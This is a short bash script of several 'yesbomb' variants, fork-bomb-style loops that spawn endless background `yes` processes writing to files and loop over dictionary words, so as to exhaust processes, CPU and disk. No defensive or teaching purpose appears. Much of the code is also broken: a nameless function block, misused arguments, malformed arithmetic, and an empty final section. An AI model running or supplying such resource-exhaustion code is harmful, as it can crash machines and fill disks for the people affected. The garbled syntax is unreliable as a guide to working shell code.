#!/usr/bin/env bash
#short version but not ready yet. ignore :(){i=0;yes balls > $temp$i &;($i++);:|:&};:

#yesbomb 1
:()
{
yes balls > file$i.txt &
($1)
: $1| : ($1 * -1) &
}
i=0
: $i

#yesbomb two
:
{
	#words=`tac /usr/share/dict/words`
	for (( i=0; ; i+=1 )); do
		yes balls > $1$i &
	done
}
words=`cat /usr/share/dict/words`
: kittykatz &
c=0
while true; do
	for word in $words; do
		: $word$c &
	done
	counter+=1
done

#yesbomb three
